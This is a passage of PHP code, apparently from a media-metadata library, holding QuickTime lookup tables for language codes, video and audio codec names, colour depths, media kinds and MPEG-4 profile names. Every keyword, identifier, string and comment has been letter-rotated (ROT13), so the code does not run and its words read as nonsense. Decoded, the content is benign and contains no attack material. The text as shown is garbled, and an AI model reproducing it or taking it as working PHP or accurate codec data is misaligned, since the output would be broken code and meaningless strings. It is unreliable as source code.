		$yratgu    = 0;
		qb {
			$o = beq(fhofge($qngn, $bssfrg++, 1));
			$yratgu = ($yratgu << 7) | ($o & 0k7S);
		} juvyr (($o & 0k80) && ($ahz_olgrf++ < 4));
		erghea $yratgu;
	}

	/**
	 * @cnenz vag $ynathntrvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrYnathntrYbbxhc($ynathntrvq) {
		// uggc://qrirybcre.nccyr.pbz/yvoenel/znp/#qbphzragngvba/DhvpxGvzr/DGSS/DGSSPunc4/dgss4.ugzy#//nccyr_ers/qbp/hvq/GC40000939-PU206-34353
		fgngvp $DhvpxgvzrYnathntrYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrYnathntrYbbxhc)) {
			$DhvpxgvzrYnathntrYbbxhc[0]     = 'Ratyvfu';
			$DhvpxgvzrYnathntrYbbxhc[1]     = 'Serapu';
			$DhvpxgvzrYnathntrYbbxhc[2]     = 'Trezna';
			$DhvpxgvzrYnathntrYbbxhc[3]     = 'Vgnyvna';
			$DhvpxgvzrYnathntrYbbxhc[4]     = 'Qhgpu';
			$DhvpxgvzrYnathntrYbbxhc[5]     = 'Fjrqvfu';
			$DhvpxgvzrYnathntrYbbxhc[6]     = 'Fcnavfu';
			$DhvpxgvzrYnathntrYbbxhc[7]     = 'Qnavfu';
			$DhvpxgvzrYnathntrYbbxhc[8]     = 'Cbeghthrfr';
			$DhvpxgvzrYnathntrYbbxhc[9]     = 'Abejrtvna';
			$DhvpxgvzrYnathntrYbbxhc[10]    = 'Uroerj';
			$DhvpxgvzrYnathntrYbbxhc[11]    = 'Wncnarfr';
			$DhvpxgvzrYnathntrYbbxhc[12]    = 'Nenovp';
			$DhvpxgvzrYnathntrYbbxhc[13]    = 'Svaavfu';
			$DhvpxgvzrYnathntrYbbxhc[14]    = 'Terrx';
			$DhvpxgvzrYnathntrYbbxhc[15]    = 'Vprynaqvp';
			$DhvpxgvzrYnathntrYbbxhc[16]    = 'Znygrfr';
			$DhvpxgvzrYnathntrYbbxhc[17]    = 'Ghexvfu';
			$DhvpxgvzrYnathntrYbbxhc[18]    = 'Pebngvna';
			$DhvpxgvzrYnathntrYbbxhc[19]    = 'Puvarfr (Genqvgvbany)';
			$DhvpxgvzrYnathntrYbbxhc[20]    = 'Heqh';
			$DhvpxgvzrYnathntrYbbxhc[21]    = 'Uvaqv';
			$DhvpxgvzrYnathntrYbbxhc[22]    = 'Gunv';
			$DhvpxgvzrYnathntrYbbxhc[23]    = 'Xberna';
			$DhvpxgvzrYnathntrYbbxhc[24]    = 'Yvguhnavna';
			$DhvpxgvzrYnathntrYbbxhc[25]    = 'Cbyvfu';
			$DhvpxgvzrYnathntrYbbxhc[26]    = 'Uhatnevna';
			$DhvpxgvzrYnathntrYbbxhc[27]    = 'Rfgbavna';
			$DhvpxgvzrYnathntrYbbxhc[28]    = 'Yrggvfu';
			$DhvpxgvzrYnathntrYbbxhc[28]    = 'Yngivna';
			$DhvpxgvzrYnathntrYbbxhc[29]    = 'Fnnzvfx';
			$DhvpxgvzrYnathntrYbbxhc[29]    = 'Ynccvfu';
			$DhvpxgvzrYnathntrYbbxhc[30]    = 'Snrebrfr';
			$DhvpxgvzrYnathntrYbbxhc[31]    = 'Snefv';
			$DhvpxgvzrYnathntrYbbxhc[31]    = 'Crefvna';
			$DhvpxgvzrYnathntrYbbxhc[32]    = 'Ehffvna';
			$DhvpxgvzrYnathntrYbbxhc[33]    = 'Puvarfr (Fvzcyvsvrq)';
			$DhvpxgvzrYnathntrYbbxhc[34]    = 'Syrzvfu';
			$DhvpxgvzrYnathntrYbbxhc[35]    = 'Vevfu';
			$DhvpxgvzrYnathntrYbbxhc[36]    = 'Nyonavna';
			$DhvpxgvzrYnathntrYbbxhc[37]    = 'Ebznavna';
			$DhvpxgvzrYnathntrYbbxhc[38]    = 'Pmrpu';
			$DhvpxgvzrYnathntrYbbxhc[39]    = 'Fybinx';
			$DhvpxgvzrYnathntrYbbxhc[40]    = 'Fybiravna';
			$DhvpxgvzrYnathntrYbbxhc[41]    = 'Lvqqvfu';
			$DhvpxgvzrYnathntrYbbxhc[42]    = 'Freovna';
			$DhvpxgvzrYnathntrYbbxhc[43]    = 'Znprqbavna';
			$DhvpxgvzrYnathntrYbbxhc[44]    = 'Ohytnevna';
			$DhvpxgvzrYnathntrYbbxhc[45]    = 'Hxenvavna';
			$DhvpxgvzrYnathntrYbbxhc[46]    = 'Olrybehffvna';
			$DhvpxgvzrYnathntrYbbxhc[47]    = 'Hmorx';
			$DhvpxgvzrYnathntrYbbxhc[48]    = 'Xnmnxu';
			$DhvpxgvzrYnathntrYbbxhc[49]    = 'Nmreonvwnav';
			$DhvpxgvzrYnathntrYbbxhc[50]    = 'NmreonvwnaNe';
			$DhvpxgvzrYnathntrYbbxhc[51]    = 'Nezravna';
			$DhvpxgvzrYnathntrYbbxhc[52]    = 'Trbetvna';
			$DhvpxgvzrYnathntrYbbxhc[53]    = 'Zbyqnivna';
			$DhvpxgvzrYnathntrYbbxhc[54]    = 'Xvetuvm';
			$DhvpxgvzrYnathntrYbbxhc[55]    = 'Gnwvxv';
			$DhvpxgvzrYnathntrYbbxhc[56]    = 'Ghexzra';
			$DhvpxgvzrYnathntrYbbxhc[57]    = 'Zbatbyvna';
			$DhvpxgvzrYnathntrYbbxhc[58]    = 'ZbatbyvnaPle';
			$DhvpxgvzrYnathntrYbbxhc[59]    = 'Cnfugb';
			$DhvpxgvzrYnathntrYbbxhc[60]    = 'Xheqvfu';
			$DhvpxgvzrYnathntrYbbxhc[61]    = 'Xnfuzvev';
			$DhvpxgvzrYnathntrYbbxhc[62]    = 'Fvaquv';
			$DhvpxgvzrYnathntrYbbxhc[63]    = 'Gvorgna';
			$DhvpxgvzrYnathntrYbbxhc[64]    = 'Arcnyv';
			$DhvpxgvzrYnathntrYbbxhc[65]    = 'Fnafxevg';
			$DhvpxgvzrYnathntrYbbxhc[66]    = 'Znenguv';
			$DhvpxgvzrYnathntrYbbxhc[67]    = 'Oratnyv';
			$DhvpxgvzrYnathntrYbbxhc[68]    = 'Nffnzrfr';
			$DhvpxgvzrYnathntrYbbxhc[69]    = 'Thwnengv';
			$DhvpxgvzrYnathntrYbbxhc[70]    = 'Chawnov';
			$DhvpxgvzrYnathntrYbbxhc[71]    = 'Bevln';
			$DhvpxgvzrYnathntrYbbxhc[72]    = 'Znynlnynz';
			$DhvpxgvzrYnathntrYbbxhc[73]    = 'Xnaanqn';
			$DhvpxgvzrYnathntrYbbxhc[74]    = 'Gnzvy';
			$DhvpxgvzrYnathntrYbbxhc[75]    = 'Gryhth';
			$DhvpxgvzrYnathntrYbbxhc[76]    = 'Fvaunyrfr';
			$DhvpxgvzrYnathntrYbbxhc[77]    = 'Ohezrfr';
			$DhvpxgvzrYnathntrYbbxhc[78]    = 'Xuzre';
			$DhvpxgvzrYnathntrYbbxhc[79]    = 'Ynb';
			$DhvpxgvzrYnathntrYbbxhc[80]    = 'Ivrganzrfr';
			$DhvpxgvzrYnathntrYbbxhc[81]    = 'Vaqbarfvna';
			$DhvpxgvzrYnathntrYbbxhc[82]    = 'Gntnybt';
			$DhvpxgvzrYnathntrYbbxhc[83]    = 'ZnynlEbzna';
			$DhvpxgvzrYnathntrYbbxhc[84]    = 'ZnynlNenovp';
			$DhvpxgvzrYnathntrYbbxhc[85]    = 'Nzunevp';
			$DhvpxgvzrYnathntrYbbxhc[86]    = 'Gvtevaln';
			$DhvpxgvzrYnathntrYbbxhc[87]    = 'Tnyyn';
			$DhvpxgvzrYnathntrYbbxhc[87]    = 'Bebzb';
			$DhvpxgvzrYnathntrYbbxhc[88]    = 'Fbznyv';
			$DhvpxgvzrYnathntrYbbxhc[89]    = 'Fjnuvyv';
			$DhvpxgvzrYnathntrYbbxhc[90]    = 'Ehnaqn';
			$DhvpxgvzrYnathntrYbbxhc[91]    = 'Ehaqv';
			$DhvpxgvzrYnathntrYbbxhc[92]    = 'Purjn';
			$DhvpxgvzrYnathntrYbbxhc[93]    = 'Znyntnfl';
			$DhvpxgvzrYnathntrYbbxhc[94]    = 'Rfcrenagb';
			$DhvpxgvzrYnathntrYbbxhc[128]   = 'Jryfu';
			$DhvpxgvzrYnathntrYbbxhc[129]   = 'Onfdhr';
			$DhvpxgvzrYnathntrYbbxhc[130]   = 'Pngnyna';
			$DhvpxgvzrYnathntrYbbxhc[131]   = 'Yngva';
			$DhvpxgvzrYnathntrYbbxhc[132]   = 'Dhrpuhn';
			$DhvpxgvzrYnathntrYbbxhc[133]   = 'Thnenav';
			$DhvpxgvzrYnathntrYbbxhc[134]   = 'Nlznen';
			$DhvpxgvzrYnathntrYbbxhc[135]   = 'Gngne';
			$DhvpxgvzrYnathntrYbbxhc[136]   = 'Hvtuhe';
			$DhvpxgvzrYnathntrYbbxhc[137]   = 'Qmbatxun';
			$DhvpxgvzrYnathntrYbbxhc[138]   = 'WninarfrEbz';
			$DhvpxgvzrYnathntrYbbxhc[32767] = 'Hafcrpvsvrq';
		}
		vs (($ynathntrvq > 138) && ($ynathntrvq < 32767)) {
			/*
			VFB Ynathntr Pbqrf - uggc://jjj.ybp.tbi/fgnaqneqf/vfb639-2/cuc/pbqr_yvfg.cuc
			Orpnhfr gur ynathntr pbqrf fcrpvsvrq ol VFB 639-2/G ner guerr punenpgref ybat, gurl zhfg or cnpxrq gb svg vagb n 16-ovg svryq.
			Gur cnpxvat nytbevguz zhfg znc rnpu bs gur guerr punenpgref, juvpu ner nyjnlf ybjrepnfr, vagb n 5-ovg vagrtre naq gura pbapngrangr
			gurfr vagrtref vagb gur yrnfg fvtavsvpnag 15 ovgf bs n 16-ovg vagrtre, yrnivat gur 16-ovg vagrtre'f zbfg fvtavsvpnag ovg frg gb mreb.

			Bar nytbevguz sbe cresbezvat guvf cnpxvat vf gb gerng rnpu VFB punenpgre nf n 16-ovg vagrtre. Fhogenpg 0k60 sebz gur svefg punenpgre
			naq zhygvcyl ol 2^10 (0k400), fhogenpg 0k60 sebz gur frpbaq punenpgre naq zhygvcyl ol 2^5 (0k20), fhogenpg 0k60 sebz gur guveq punenpgre,
			naq nqq gur guerr 16-ovg inyhrf. Guvf jvyy erfhyg va n fvatyr 16-ovg inyhr jvgu gur guerr pbqrf pbeerpgyl cnpxrq vagb gur 15 yrnfg
			fvtavsvpnag ovgf naq gur zbfg fvtavsvpnag ovg frg gb mreb.
			*/
			$vfb_ynathntr_vq  = '';
			$vfb_ynathntr_vq .= pue((($ynathntrvq & 0k7P00) >> 10) + 0k60);
			$vfb_ynathntr_vq .= pue((($ynathntrvq & 0k03R0) >>  5) + 0k60);
			$vfb_ynathntr_vq .= pue((($ynathntrvq & 0k001S) >>  0) + 0k60);
			$DhvpxgvzrYnathntrYbbxhc[$ynathntrvq] = trgvq3_vq3i2::YnathntrYbbxhc($vfb_ynathntr_vq);
		}
		erghea (vffrg($DhvpxgvzrYnathntrYbbxhc[$ynathntrvq]) ? $DhvpxgvzrYnathntrYbbxhc[$ynathntrvq] : 'vainyvq');
	}

	/**
	 * @cnenz fgevat $pbqrpvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrIvqrbPbqrpYbbxhc($pbqrpvq) {
		fgngvp $DhvpxgvzrIvqrbPbqrpYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrIvqrbPbqrpYbbxhc)) {
			$DhvpxgvzrIvqrbPbqrpYbbxhc['.FTV'] = 'FTV';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['3VI1'] = '3vik ZCRT-4 i1';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['3VI2'] = '3vik ZCRT-4 i2';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['3VIK'] = '3vik ZCRT-4';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['8OCF'] = 'Cynane ETO';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['nip1'] = 'U.264/ZCRT-4 NIP';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['nie '] = 'NIE-WCRT';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['o16t'] = '16Tenl';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['o32n'] = '32NycunTenl';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['o48e'] = '48ETO';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['o64n'] = '64NETO';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['onfr'] = 'Onfr';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['pybh'] = 'Pybhq';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['pzlx'] = 'PZLX';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['pivq'] = 'Pvarcnx';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['qzo1'] = 'BcraQZY WCRT';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['qip '] = 'QIP-AGFP';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['qipc'] = 'QIP-CNY';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['qica'] = 'QIPCeb-AGFP';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['qicc'] = 'QIPCeb-CNY';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['sver'] = 'Sver';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['syvp'] = 'SYP';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['tvs '] = 'TVS';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['u261'] = 'U261';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['u263'] = 'U263';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['uip1'] = 'U.265/URIP';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['VI41'] = 'Vaqrb4';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['wcrt'] = 'WCRT';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['xcpq'] = 'CubgbPQ';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['zwcn'] = 'Zbgvba WCRT-N';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['zwco'] = 'Zbgvba WCRT-O';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['zfip'] = 'Zvpebfbsg Ivqrb1';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['zlhi'] = 'ZCRT LHI420';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['cngu'] = 'Irpgbe';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['cat '] = 'CAT';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['CAGT'] = 'ZnpCnvag';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['dqtk'] = 'DhvpxQenjTK';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['dqej'] = 'DhvpxQenj';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['enj '] = 'ENJ';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['evcy'] = 'JngreEvccyr';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['ecmn'] = 'Ivqrb';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['fzp '] = 'Tencuvpf';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['FID1'] = 'Fberafba Ivqrb 1';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['FID1'] = 'Fberafba Ivqrb 3';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['fli9'] = 'Fberafba LHI9';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['gtn '] = 'Gnetn';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['gvss'] = 'GVSS';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['JENJ'] = 'Jvaqbjf ENJ';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['JEYR'] = 'OZC';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['l420'] = 'LHI420';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['lhi2'] = 'PbzcbaragIvqrb';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['lhif'] = 'PbzcbaragIvqrbHafvtarq';
			$DhvpxgvzrIvqrbPbqrpYbbxhc['lhih'] = 'PbzcbaragIvqrbFvtarq';
		}
		erghea (vffrg($DhvpxgvzrIvqrbPbqrpYbbxhc[$pbqrpvq]) ? $DhvpxgvzrIvqrbPbqrpYbbxhc[$pbqrpvq] : '');
	}

	/**
	 * @cnenz fgevat $pbqrpvq
	 *
	 * @erghea zvkrq|fgevat
	 */
	choyvp shapgvba DhvpxgvzrNhqvbPbqrpYbbxhc($pbqrpvq) {
		fgngvp $DhvpxgvzrNhqvbPbqrpYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrNhqvbPbqrpYbbxhc)) {
			$DhvpxgvzrNhqvbPbqrpYbbxhc['.zc3']          = 'Senhaubsre ZCRT Ynlre-VVV nyvnf';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['nnp ']          = 'VFB/VRP 14496-3 NNP';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ntfz']          = 'Nccyr TFZ 10:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['nynp']          = 'Nccyr Ybffyrff Nhqvb Pbqrp';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['nynj']          = 'N-ynj 2:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['pbai']          = 'Fnzcyr Sbezng';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['qipn']          = 'QI';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['qiv ']          = 'QI 4:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['rdny']          = 'Serdhrapl Rdhnyvmre';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['sy32']          = '32-ovg Sybngvat Cbvag';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['sy64']          = '64-ovg Sybngvat Cbvag';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['vzn4']          = 'Vagrenpgvir Zhygvzrqvn Nffbpvngvba 4:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['va24']          = '24-ovg Vagrtre';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['va32']          = '32-ovg Vagrtre';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ycp ']          = 'YCP 23:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ZNP3']          = 'Znpvagbfu Nhqvb Pbzcerffvba/Rkcnafvba (ZNPR) 3:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ZNP6']          = 'Znpvagbfu Nhqvb Pbzcerffvba/Rkcnafvba (ZNPR) 6:1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['zvko']          = '8-ovg Zvkre';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['zvkj']          = '16-ovg Zvkre';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['zc4n']          = 'VFB/VRP 14496-3 NNP';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ZF'.\"\k00\k02\"] = 'Zvpebfbsg NQCPZ';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ZF'.\"\k00\k11\"] = 'QI VZN';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ZF'.\"\k00\k55\"] = 'Senhaubsre ZCRT Ynlre VVV';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['ABAR']          = 'Ab Rapbqvat';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['Dpyc']          = 'Dhnypbzz CherIbvpr';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['DQZ2']          = 'DQrfvta Zhfvp 2';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['DQZP']          = 'DQrfvta Zhfvp 1';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['engo']          = '8-ovg Engr';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['engj']          = '16-ovg Engr';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['enj ']          = 'enj CPZ';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['fbhe']          = 'Fbhaq Fbhepr';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['fbjg']          = 'fvtarq/gjb\'f pbzcyrzrag (Yvggyr Raqvna)';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['fge1']          = 'Vbzrtn ZCRT ynlre VV';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['fge2']          = 'Vbzrtn ZCRT *ynlre VV';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['fge3']          = 'Vbzrtn ZCRT **ynlre VV';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['fge4']          = 'Vbzrtn ZCRT ***ynlre VV';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['gjbf']          = 'fvtarq/gjb\'f pbzcyrzrag (Ovt Raqvna)';
			$DhvpxgvzrNhqvbPbqrpYbbxhc['hynj']          = 'zh-ynj 2:1';
		}
		erghea (vffrg($DhvpxgvzrNhqvbPbqrpYbbxhc[$pbqrpvq]) ? $DhvpxgvzrNhqvbPbqrpYbbxhc[$pbqrpvq] : '');
	}

	/**
	 * @cnenz fgevat $pbzcerffvbavq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrQPBZYbbxhc($pbzcerffvbavq) {
		fgngvp $DhvpxgvzrQPBZYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrQPBZYbbxhc)) {
			$DhvpxgvzrQPBZYbbxhc['myvo'] = 'MYvo Qrsyngr';
			$DhvpxgvzrQPBZYbbxhc['nqrp'] = 'Nccyr Pbzcerffvba';
		}
		erghea (vffrg($DhvpxgvzrQPBZYbbxhc[$pbzcerffvbavq]) ? $DhvpxgvzrQPBZYbbxhc[$pbzcerffvbavq] : '');
	}

	/**
	 * @cnenz vag $pbybeqrcguvq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrPbybeAnzrYbbxhc($pbybeqrcguvq) {
		fgngvp $DhvpxgvzrPbybeAnzrYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrPbybeAnzrYbbxhc)) {
			$DhvpxgvzrPbybeAnzrYbbxhc[1]  = '2-pbybe (zbabpuebzr)';
			$DhvpxgvzrPbybeAnzrYbbxhc[2]  = '4-pbybe';
			$DhvpxgvzrPbybeAnzrYbbxhc[4]  = '16-pbybe';
			$DhvpxgvzrPbybeAnzrYbbxhc[8]  = '256-pbybe';
			$DhvpxgvzrPbybeAnzrYbbxhc[16] = 'gubhfnaqf (16-ovg pbybe)';
			$DhvpxgvzrPbybeAnzrYbbxhc[24] = 'zvyyvbaf (24-ovg pbybe)';
			$DhvpxgvzrPbybeAnzrYbbxhc[32] = 'zvyyvbaf+ (32-ovg pbybe)';
			$DhvpxgvzrPbybeAnzrYbbxhc[33] = 'oynpx & juvgr';
			$DhvpxgvzrPbybeAnzrYbbxhc[34] = '4-tenl';
			$DhvpxgvzrPbybeAnzrYbbxhc[36] = '16-tenl';
			$DhvpxgvzrPbybeAnzrYbbxhc[40] = '256-tenl';
		}
		erghea (vffrg($DhvpxgvzrPbybeAnzrYbbxhc[$pbybeqrcguvq]) ? $DhvpxgvzrPbybeAnzrYbbxhc[$pbybeqrcguvq] : 'vainyvq');
	}

	/**
	 * @cnenz vag $fgvx
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrFGVXYbbxhc($fgvx) {
		fgngvp $DhvpxgvzrFGVXYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrFGVXYbbxhc)) {
			$DhvpxgvzrFGVXYbbxhc[0]  = 'Zbivr';
			$DhvpxgvzrFGVXYbbxhc[1]  = 'Abezny';
			$DhvpxgvzrFGVXYbbxhc[2]  = 'Nhqvbobbx';
			$DhvpxgvzrFGVXYbbxhc[5]  = 'Junpxrq Obbxznex';
			$DhvpxgvzrFGVXYbbxhc[6]  = 'Zhfvp Ivqrb';
			$DhvpxgvzrFGVXYbbxhc[9]  = 'Fubeg Svyz';
			$DhvpxgvzrFGVXYbbxhc[10] = 'GI Fubj';
			$DhvpxgvzrFGVXYbbxhc[11] = 'Obbxyrg';
			$DhvpxgvzrFGVXYbbxhc[14] = 'Evatgbar';
			$DhvpxgvzrFGVXYbbxhc[21] = 'Cbqpnfg';
		}
		erghea (vffrg($DhvpxgvzrFGVXYbbxhc[$fgvx]) ? $DhvpxgvzrFGVXYbbxhc[$fgvx] : 'vainyvq');
	}

	/**
	 * @cnenz vag $nhqvb_cebsvyr_vq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrVBQFnhqvbCebsvyrAnzr($nhqvb_cebsvyr_vq) {
		fgngvp $DhvpxgvzrVBQFnhqvbCebsvyrAnzrYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrVBQFnhqvbCebsvyrAnzrYbbxhc)) {
			$DhvpxgvzrVBQFnhqvbCebsvyrAnzrYbbxhc = neenl(
				0k00 => 'VFB Erfreirq (0k00)',
				0k01 => 'Znva Nhqvb Cebsvyr @ Yriry 1',
				0k02 => 'Znva Nhqvb Cebsvyr @ Yriry 2',
				0k03 => 'Znva Nhqvb Cebsvyr @ Yriry 3',
				0k04 => 'Znva Nhqvb Cebsvyr @ Yriry 4',
				0k05 => 'Fpnynoyr Nhqvb Cebsvyr @ Yriry 1',
				0k06 => 'Fpnynoyr Nhqvb Cebsvyr @ Yriry 2',
				0k07 => 'Fpnynoyr Nhqvb Cebsvyr @ Yriry 3',
				0k08 => 'Fpnynoyr Nhqvb Cebsvyr @ Yriry 4',
				0k09 => 'Fcrrpu Nhqvb Cebsvyr @ Yriry 1',
				0k0N => 'Fcrrpu Nhqvb Cebsvyr @ Yriry 2',
				0k0O => 'Flagurgvp Nhqvb Cebsvyr @ Yriry 1',
				0k0P => 'Flagurgvp Nhqvb Cebsvyr @ Yriry 2',
				0k0Q => 'Flagurgvp Nhqvb Cebsvyr @ Yriry 3',
				0k0R => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 1',
				0k0S => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 2',
				0k10 => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 3',
				0k11 => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 4',
				0k12 => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 5',
				0k13 => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 6',
				0k14 => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 7',
				0k15 => 'Uvtu Dhnyvgl Nhqvb Cebsvyr @ Yriry 8',
				0k16 => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 1',
				0k17 => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 2',
				0k18 => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 3',
				0k19 => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 4',
				0k1N => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 5',
				0k1O => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 6',
				0k1P => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 7',
				0k1Q => 'Ybj Qrynl Nhqvb Cebsvyr @ Yriry 8',
				0k1R => 'Angheny Nhqvb Cebsvyr @ Yriry 1',
				0k1S => 'Angheny Nhqvb Cebsvyr @ Yriry 2',
				0k20 => 'Angheny Nhqvb Cebsvyr @ Yriry 3',
				0k21 => 'Angheny Nhqvb Cebsvyr @ Yriry 4',
				0k22 => 'Zbovyr Nhqvb Vagreargjbexvat Cebsvyr @ Yriry 1',
				0k23 => 'Zbovyr Nhqvb Vagreargjbexvat Cebsvyr @ Yriry 2',
				0k24 => 'Zbovyr Nhqvb Vagreargjbexvat Cebsvyr @ Yriry 3',
				0k25 => 'Zbovyr Nhqvb Vagreargjbexvat Cebsvyr @ Yriry 4',
				0k26 => 'Zbovyr Nhqvb Vagreargjbexvat Cebsvyr @ Yriry 5',
				0k27 => 'Zbovyr Nhqvb Vagreargjbexvat Cebsvyr @ Yriry 6',
				0k28 => 'NNP Cebsvyr @ Yriry 1',
				0k29 => 'NNP Cebsvyr @ Yriry 2',
				0k2N => 'NNP Cebsvyr @ Yriry 4',
				0k2O => 'NNP Cebsvyr @ Yriry 5',
				0k2P => 'Uvtu Rssvpvrapl NNP Cebsvyr @ Yriry 2',
				0k2Q => 'Uvtu Rssvpvrapl NNP Cebsvyr @ Yriry 3',
				0k2R => 'Uvtu Rssvpvrapl NNP Cebsvyr @ Yriry 4',
				0k2S => 'Uvtu Rssvpvrapl NNP Cebsvyr @ Yriry 5',
				0kSR => 'Abg cneg bs ZCRT-4 nhqvb cebsvyrf',
				0kSS => 'Ab nhqvb pncnovyvgl erdhverq',
			);
		}
		erghea (vffrg($DhvpxgvzrVBQFnhqvbCebsvyrAnzrYbbxhc[$nhqvb_cebsvyr_vq]) ? $DhvpxgvzrVBQFnhqvbCebsvyrAnzrYbbxhc[$nhqvb_cebsvyr_vq] : 'VFB Erfreirq / Hfre Cevingr');
	}

	/**
	 * @cnenz vag $ivqrb_cebsvyr_vq
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba DhvpxgvzrVBQFivqrbCebsvyrAnzr($ivqrb_cebsvyr_vq) {
		fgngvp $DhvpxgvzrVBQFivqrbCebsvyrAnzrYbbxhc = neenl();
		vs (rzcgl($DhvpxgvzrVBQFivqrbCebsvyrAnzrYbbxhc)) {
			$DhvpxgvzrVBQFivqrbCebsvyrAnzrYbbxhc = neenl(
				0k00 => 'Erfreirq (0k00) Cebsvyr',
				0k01 => 'Fvzcyr Cebsvyr @ Yriry 1',
				0k02 => 'Fvzcyr Cebsvyr @ Yriry 2',
